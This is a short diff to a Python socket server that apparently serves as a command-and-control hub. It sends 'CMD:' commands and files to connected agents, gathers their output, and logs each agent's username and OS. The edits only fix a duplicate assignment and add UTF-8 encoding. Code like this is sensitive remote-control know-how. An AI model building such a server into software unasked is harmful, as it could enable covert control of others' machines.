@@ -131,8 +131,8 @@ class AgentHandler(threading.Thread):
                     self.agent_socket.sendall(file_data)
                     cache.set('command_data', {})
                 elif command:
-                    marked_command = marked_command = f"CMD:{command}"
-                    self.agent_socket.send(marked_command.encode())
+                    marked_command = f"CMD:{command}"
+                    self.agent_socket.send(marked_command.encode("utf-8"))
                     cache.set('command_data', {})
 
                     if command.lower() == "exit":
@@ -140,7 +140,7 @@ class AgentHandler(threading.Thread):
                         send_command_response_to_group()
                         break
 
-                response = self.agent_socket.recv(4096).decode()
+                response = self.agent_socket.recv(4096).decode("utf-8")
 
                 responses_dict = cache.get('command_responses', {})
                 responses_dict[self.agent_id] = response
@@ -169,8 +169,8 @@ def main():
         while True:
             agent_socket, agent_address = server_socket.accept()
             agent_handler = AgentHandler(agent_socket, agent_address)
-            username = agent_socket.recv(4096).decode()
-            client_os = agent_socket.recv(4096).decode()
+            username = agent_socket.recv(4096).decode("utf-8")
+            client_os = agent_socket.recv(4096).decode("utf-8")
             agent_handler.start()
             # Add the client to the list
             add_client(agent_handler.agent_id,
